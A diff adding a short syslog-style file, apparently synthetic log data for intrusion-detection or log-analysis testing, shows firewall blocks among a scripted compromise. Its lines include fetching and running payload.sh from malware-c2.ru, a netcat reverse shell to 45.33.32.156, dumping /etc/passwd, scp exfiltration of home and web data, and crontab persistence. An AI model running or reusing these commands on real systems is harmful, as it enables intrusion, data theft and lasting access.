@@ -1,0 +1,14 @@
+Apr 29 02:10:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.105 DST=10.0.0.1 PROTO=TCP SPT=52340 DPT=22
+Apr 29 02:11:10 server cron[3001]: (root) CMD (wget http://malware-c2.ru/payload.sh -O /tmp/payload.sh)
+Apr 29 02:11:15 server cron[3001]: (root) CMD (chmod +x /tmp/payload.sh && /tmp/payload.sh)
+Apr 29 02:12:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.200 DST=10.0.0.1 PROTO=TCP SPT=44000 DPT=80
+Apr 29 02:13:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.200 DST=10.0.0.1 PROTO=TCP SPT=44001 DPT=443
+Apr 29 02:14:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.200 DST=10.0.0.1 PROTO=TCP SPT=44002 DPT=8080
+Apr 29 02:15:00 server systemd[1]: Started reverse-shell.service.
+Apr 29 02:16:00 server bash[4001]: root: nc -e /bin/bash 45.33.32.156 4444
+Apr 29 02:17:00 server bash[4002]: root: cat /etc/passwd > /tmp/dump.txt
+Apr 29 02:18:00 server bash[4003]: root: tar czf /tmp/data.tar.gz /home /var/www
+Apr 29 02:19:00 server bash[4004]: root: scp /tmp/data.tar.gz attacker@45.33.32.156:/exfil/
+Apr 29 02:20:00 server kernel: nf_conntrack: table full, dropping packet
+Apr 29 02:21:00 server bash[4005]: root: crontab -e
+Apr 29 02:22:00 server bash[4006]: root: echo "*/5 * * * * /tmp/payload.sh" >> /etc/crontab
